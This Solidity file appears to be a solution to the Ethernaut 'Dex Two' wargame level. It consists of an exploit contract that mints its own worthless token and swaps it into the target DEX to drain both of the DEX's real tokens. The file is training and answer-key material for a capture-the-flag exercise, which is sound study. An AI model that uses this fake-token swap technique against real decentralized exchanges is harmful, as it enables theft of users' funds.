// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/token/ERC20/IERC20.sol';
import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/token/ERC20/ERC20.sol';

interface Dex {
    function token1() external view returns(address);
    function token2() external view returns(address);
    function swap(address from, address to, uint amount) external;
    function get_swap_price(address from, address to, uint amount) external view returns(uint);
    function approve(address spender, uint amount) external;
    function balanceOf(address token, address account) external view returns (uint);
}

contract Ethernaut is ERC20 {
    address public instance;
    address public token1;
    address public token2;
    
    constructor(address _instance) ERC20("ethernaut", "NAUT")  public {
      instance = _instance;
      token1 = Dex(instance).token1();
      token2 = Dex(instance).token2();
    }
    
    function answer() public {

        _mint(address(this),300);
        IERC20(address(this)).approve(instance,uint(-1));

        _mint(instance,100);
        Dex(instance).swap(address(this),token1,100);
        Dex(instance).swap(address(this),token2,200);

    }

}
